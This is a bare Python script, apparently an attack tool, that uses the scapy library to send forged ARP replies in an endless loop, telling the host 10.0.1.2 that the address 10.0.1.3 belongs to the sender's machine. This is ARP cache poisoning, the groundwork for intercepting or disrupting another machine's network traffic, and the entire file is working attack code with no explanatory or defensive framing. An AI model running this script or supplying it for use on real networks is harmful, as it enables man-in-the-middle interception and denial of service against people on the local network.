from scapy.all import ARP, Ether, sendp
import time

target_ip = "10.0.1.2"
spoof_ip = "10.0.1.3"

def arp_spoof():
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(op=2, psrc=spoof_ip, pdst=target_ip)
    packet = ether / arp
    sendp(packet, iface="eth0", verbose=False)

while True:
    arp_spoof()
    time.sleep(2)